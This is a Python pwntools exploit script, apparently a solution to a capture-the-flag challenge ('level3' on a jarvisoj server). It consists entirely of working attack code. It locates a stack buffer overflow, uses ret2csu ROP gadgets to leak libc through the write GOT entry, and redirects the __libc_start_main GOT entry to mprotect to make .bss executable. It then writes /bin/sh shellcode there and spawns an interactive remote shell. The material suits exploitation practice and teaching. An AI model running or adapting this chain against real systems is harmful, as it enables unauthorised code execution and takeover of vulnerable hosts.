#encoding:utf-8

from pwn import *

context.arch = "amd64"
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'


class Pwn(object):

    def __init__(self, binary_file=None, remote=None):
        if binary_file:
            self.binary_file = binary_file
            self.elf = ELF(self.binary_file)
            self.local_libc = '/lib/x86_64-linux-gnu/libc.so.6'
            self.remote_libc = './libc-2.19.so'
   
        if remote:
            self.host = remote['host']
            self.port = remote['port']


    def get_overflow_position(self):
        io = self.get_io(False)
        io.recvline()
        io.send(cyclic(600))
        io.recvall()

        if os.path.isfile('./core'):
            core = Core('./core')
            self.rip = cyclic_find(core.u32(core.rsp))
            print 'rip:', hex(self.rip)


    def get_io(self, remote_sign=False):
        io = None
        if remote_sign:
            io = remote(self.host, self.port)
        else:
            io = process(self.binary_file)
            # io = process([self.binary_file], env={"LD_PRELOAD":"./libc.so"})
        return io

    def _call_rop(self, func_got, arg1, arg2, arg3, ret_func):
        payload = 'a' * self.rip 
        payload += p64(self.pop_multi_addr) + p64(0) + p64(1) 
        payload += p64(func_got)
        payload += p64(arg3) + p64(arg2) + p64(arg1)
        payload += p64(self.ret_addr)
        payload += 'a' * 56
        payload += p64(ret_func)
        self.io.send(payload)

    
    def get_shell(self):
        self.io = self.get_io(True)
        # self.io = self.get_io(False)
        self.io.recvline()
        # gdb.attach(self.io, 'b vulnerable_function')
        libc = ELF(self.remote_libc)
        # libc = ELF(self.local_libc)

        write_plt = self.elf.symbols['write']
        read_plt = self.elf.symbols['read']
        write_got = self.elf.got['write']
        read_got = self.elf.got['read']
        start_main_got = self.elf.got['__libc_start_main']
        
        self.pop_multi_addr = 0x4006AA
        self.ret_addr = 0x400690

        print 'getting write_got address...'
        self._call_rop(func_got=write_got, 
                       arg1=1,
                       arg2=write_got,
                       arg3=8,
                       ret_func=self.elf.symbols['main'])
        write_got_plt = self.io.unpack()
        self.io.recvline()
        print "write_got_plt:", hex(write_got_plt)

        libc.address = write_got_plt - libc.symbols['write']
        libc_mprotect_plt = libc.symbols['mprotect']

        print 'write libc_mprotect_plt to write_got address...'
        # read data to write_got with mprotect
        print 'libc_mprotect_plt:', hex(libc_mprotect_plt)
        print 'start_main_got:', hex(start_main_got)
        self._call_rop(func_got=read_got, 
                       arg1=0,
                       arg2=start_main_got,
                       arg3=8,
                       ret_func=self.elf.symbols['main'])
        self.io.send(p64(libc_mprotect_plt))
        self.io.recvline()
        
        # shellcode = asm(shellcraft.amd64.linux.cat("flag"), arch="amd64", os="linux")
        shellcode = asm(shellcraft.amd64.sh())
        print 'chmod bss privileges'
        start_address = 0x600000
        chmod_length = 0x1000
        self._call_rop(func_got=start_main_got, 
                       # arg1=self.elf.bss(), # start address
                       arg1=start_address, # start address
                       # arg2=len(shellcode),
                       arg2=chmod_length,
                       arg3=0x1|0x2|0x4,
                       ret_func=self.elf.symbols['main'])

        print 'writing shellcode to bss...'
        print 'bss address:', hex(self.elf.bss())
        print 'shellcode:', shellcode
        self.io.recvline()
        self._call_rop(func_got=read_got, 
                       arg1=0,
                       arg2=self.elf.bss(),
                       arg3=len(shellcode),
                       ret_func=self.elf.symbols['main'])
                       # ret_func=self.elf.bss()) # 测试完成利用gdb 更改rip跳转
        print 'shellcode disassembly:', disasm(shellcode)
        self.io.send(shellcode)

        print 'goto shellcode to execute'
        self.io.recvline()
        self.io.send(fit({self.rip:self.elf.bss()}))
        self.io.interactive()


def main():
    pwn = Pwn(remote={'host':'pwn2.jarvisoj.com', 'port':9884}, binary_file='./level3')
    pwn.get_overflow_position()
    pwn.get_shell()


if __name__ == "__main__":
    main()
